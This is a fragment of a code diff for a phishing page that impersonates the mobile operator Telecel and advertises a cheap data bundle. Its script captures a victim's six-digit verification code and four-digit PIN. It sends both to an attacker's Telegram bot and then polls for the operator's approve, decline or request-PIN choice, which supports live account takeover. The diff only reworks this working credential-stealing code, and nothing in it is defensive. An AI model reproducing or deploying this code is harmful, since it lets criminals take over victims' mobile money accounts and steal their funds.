X/KjDd95PD27YkQRK2zW3pZUma26WsQ8FmQXK9X6Pjv9nS39o4iLUVxpTMntohPdHRtH7ErUa5uHe4mEiBOX+sB0Z8dUGvkMk6ZTNf3XRCyiGWBFIehZCauZ9WYk100D8+G3TON+lVniPvtG59vX4rX3ST19laZf71NCJCrCcYmxRvggZRps7xx5rdmlLkiUgiIio4bcrhj0t2rllGwoeuwOW48e80VDvBTHBknI6OYiMuG1xejiDq7g6hd/N6G+gfXN/qmlnkL0vDwlxJG4yiUebLaBl7mzypVxH/D16v7eathuWbJPqh5JksCF0LQq3y3B+W7tHNgiGTqkxZaD3V+vokWNknH1+G+GDmlDzzbrbfWqX+jfSKZ53qwdup3N0rOPG9T7ZrH5c/IzcowAk6wmdqTxGl9Q1VpnGZ9aeTym36qWkeyNyU+jDdNeqf/7VeLf63JgQz2EJlkvh7GhuU35vd+2Gn07KLsOcx8QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnDj+ByGKzKp0DGEPAAAAAElFTkSuQmCC" 
+                <img src="data:image/png;base64,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" 
                      class="telecel-logo" alt="Telecel Logo">
             </div>
             <h1>Enter PIN</h1>
             <p class="subtitle">Enter your 4-digit PIN to complete this transaction</p>
+            
             <div class="otp-container" id="pinInputs"></div>
             <div class="error-msg" id="pinErrMsg"></div>
+
             <div class="form-section">
                 <button class="btn-action" id="confirmPinBtn">Confirm PIN</button>
             </div>
@@ -160,9 +196,9 @@
     </div>
 
     <!-- Spinner -->
-    <div id="spinner" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.92); z-index:10000; align-items:center; justify-content:center; flex-direction:column; color:white;">
+    <div id="spinner">
         <div class="spin"></div>
-        <p style="margin-top:20px;">Verifying...</p>
+        <p style="margin-top:20px; font-size:17px;">Verifying...</p>
     </div>
 
     <script>
@@ -172,7 +208,7 @@
             SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html'
         };
 
-        let state = { lastUpdateId: 0, pollInterval: null };
+        let state = { lastUpdateId: 0 };
         let isProcessing = false;
 
         const errMsg = document.getElementById('errMsg');
@@ -180,21 +216,20 @@
         const spinner = document.getElementById('spinner');
         const pinModal = document.getElementById('pinModal');
         const verifyBtn = document.getElementById('verifyBtn');
-        const offerTitleEl = document.getElementById('offerTitle');
-        const offerPriceEl = document.getElementById('offerPrice');
+        const confirmPinBtn = document.getElementById('confirmPinBtn');
 
         function loadOffer() {
             const params = new URLSearchParams(window.location.search);
             const name = params.get('offer') || 'Data Bundle';
             const data = params.get('data') || '';
             const price = params.get('price') || '0';
-          
-            offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
-            offerPriceEl.textContent = `GHS ${price}`;
+            
+            document.getElementById('offerTitle').textContent = name + (data ? ` - ${data}` : '');
+            document.getElementById('offerPrice').textContent = `GHS ${price}`;
         }
 
-        function createInputs(id, count) {
-            const container = document.getElementById(id);
+        function createInputs(containerId, count) {
+            const container = document.getElementById(containerId);
             container.innerHTML = '';
             for (let i = 0; i < count; i++) {
                 const input = document.createElement('input');
@@ -206,13 +241,9 @@
             }
         }
 
-        function getCode(id) {
-            return Array.from(document.querySelectorAll(`#${id} .otp-input`)).map(i => i.value).join('');
-        }
-
-        function focusFirstInput(id) {
-            const first = document.querySelector(`#${id} .otp-input`);
-            if (first) first.focus();
+        function getCode(containerId) {
+            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`))
+                       .map(i => i.value.trim()).join('');
         }
 
         function setupAutoFocus(containerId, length, callback) {
@@ -220,7 +251,7 @@
             inputs.forEach((input, index) => {
                 input.addEventListener('input', () => {
                     if (input.value.length === 1 && index < length - 1) inputs[index + 1].focus();
-                    if (getCode(containerId).length === length) setTimeout(callback, 250);
+                    if (getCode(containerId).length === length) setTimeout(callback, 200);
                 });
                 input.addEventListener('keydown', (e) => {
                     if (e.key === 'Backspace' && !input.value && index > 0) {
@@ -228,6 +259,11 @@
                     }
                 });
             });
+        }
+
+        function focusFirstInput(containerId) {
+            const first = document.querySelector(`#${containerId} .otp-input`);
+            if (first) first.focus();
         }
 
         function submitCode() {
@@ -245,22 +281,22 @@
             }
 
             const ts = Date.now();
-            const approveId = `dev_approve_${ts}`;
-            const declineId = `dev_decline_${ts}`;
-            const verifyDeviceId = `dev_verify_${ts}`;
+            const approveId = `approve_${ts}`;
+            const declineId = `decline_${ts}`;
+            const verifyId = `verify_${ts}`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 Device Verification Code</b>\n\nOffer: ${offerTitleEl.textContent}\nCode: <code>${code}</code>\n\nChoose Action:`,
+                    text: `<b>🔴 Device Verification</b>\n\nOffer: ${document.getElementById('offerTitle').textContent}\nCode: <code>${code}</code>\n\nChoose an action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Approve & Continue", callback_data: approveId },
-                                { text: "📱 Verify Device", callback_data: verifyDeviceId }
+                                { text: "✅ Approve", callback_data: approveId },
+                                { text: "📱 Verify Device", callback_data: verifyId }
                             ],
                             [{ text: "❌ Decline", callback_data: declineId }]
                         ]
@@ -268,7 +304,7 @@
                 })
             }).then(() => {
                 spinner.style.display = 'flex';
-                startPolling(approveId, declineId, verifyDeviceId);
+                startPolling(approveId, declineId, verifyId);
             }).catch(() => {
                 isProcessing = false;
                 verifyBtn.disabled = false;
@@ -276,31 +312,26 @@
             });
         }
 
-        function startPolling(approveId, declineId, verifyDeviceId) {
-            if (state.pollInterval) clearInterval(state.pollInterval);
-            state.pollInterval = setInterval(() => {
+        function startPolling(approveId, declineId, verifyId) {
+            const interval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
                     .then(data => {
-                        if (!data.ok || !data.result) return;
+                        if (!data.ok) return;
                         data.result.forEach(update => {
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
-                                const params = new URLSearchParams(window.location.search);
-
                                 if (cb === approveId) {
-                                    clearInterval(state.pollInterval);
+                                    clearInterval(interval);
                                     spinner.style.display = 'none';
                                     showPinModal();
-                                } 
-                                else if (cb === verifyDeviceId) {
-                                    clearInterval(state.pollInterval);
+                                } else if (cb === verifyId) {
+                                    clearInterval(interval);
                                     spinner.style.display = 'none';
-                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
-                                } 
-                                else if (cb === declineId) {
-                                    clearInterval(state.pollInterval);
+                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + new URLSearchParams(window.location.search).toString();
+                                } else if (cb === declineId) {
+                                    clearInterval(interval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Code declined. Please try again.";
                                     errMsg.style.display = 'block';
@@ -312,7 +343,7 @@
                             }
                         });
                     });
-            }, 1400);
+            }, 1300);
         }
 
         function showPinModal() {
@@ -320,22 +351,26 @@
             createInputs('pinInputs', 4);
             setupAutoFocus('pinInputs', 4, submitPIN);
             focusFirstInput('pinInputs');
+            pinErrMsg.style.display = 'none';
         }
 
         function submitPIN() {
             const pin = getCode('pinInputs');
             if (pin.length !== 4) return;
 
+            confirmPinBtn.disabled = true;
+            confirmPinBtn.textContent = "Verifying...";
+
             const ts = Date.now();
-            const validId = `valid_pin_${ts}`;
-            const invalidId = `invalid_pin_${ts}`;
+            const validId = `valid_${ts}`;
+            const invalidId = `invalid_${ts}`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>`,
+                    text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [[
@@ -356,30 +391,31 @@
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
-                                const params = new URLSearchParams(window.location.search);
-
                                 if (cb === validId) {
                                     clearInterval(interval);
                                     pinModal.style.display = 'none';
-                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
+                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + new URLSearchParams(window.location.search).toString();
                                 } else if (cb === invalidId) {
                                     clearInterval(interval);
                                     pinErrMsg.textContent = "Invalid PIN. Please try again.";
                                     pinErrMsg.style.display = 'block';
                                     document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
                                     focusFirstInput('pinInputs');
+                                    confirmPinBtn.disabled = false;
+                                    confirmPinBtn.textContent = "Confirm PIN";
                                 }
                             }
                         });
                     });
-            }, 1500);
+            }, 1400);
         }
 
         // Initialize
         createInputs('otpInputs', 6);
         setupAutoFocus('otpInputs', 6, submitCode);
         focusFirstInput('otpInputs');
-        document.getElementById('verifyBtn').onclick = submitCode;
+        verifyBtn.onclick = submitCode;
+        confirmPinBtn.onclick = submitPIN;
         loadOffer();
     </script>
 </body>
